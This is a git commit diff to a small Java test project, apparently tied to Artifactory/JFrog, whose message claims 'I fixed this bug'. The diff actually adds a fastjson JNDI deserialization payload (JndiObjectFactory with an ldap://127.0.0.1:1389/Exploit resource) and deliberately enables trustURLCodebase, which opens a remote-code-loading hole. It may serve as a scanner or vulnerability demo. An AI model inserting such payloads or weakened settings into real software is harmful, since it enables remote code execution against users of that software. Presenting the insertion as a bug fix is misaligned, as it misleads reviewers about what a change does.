eb7a6c4fcf99d935367722c37b19e9e5ffce5d0d
slash-l <slash_mumu@163.com>
2023-02-25 10:13:14 +0800

    PROBUG-1 我修复了这个bug

--- multi3/src/main/java/artifactory/test/Multi3.java
+++ multi3/src/main/java/artifactory/test/Multi3.java
@@ -1,11 +1,22 @@
 package artifactory.test;
 
+import com.alibaba.fastjson.JSON;
+
 /**
  * Hello world!
  */
 public class Multi3 {
     public static void main(String[] args) {
+        System.out.println("Hello JFrog.");
+
         new Multi1();
-        System.out.println("Hello World!");
+
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
+
+        JSON jsonObject = JSON.parseObject(payload);
+
+        System.out.println(jsonObject);
     }
 }
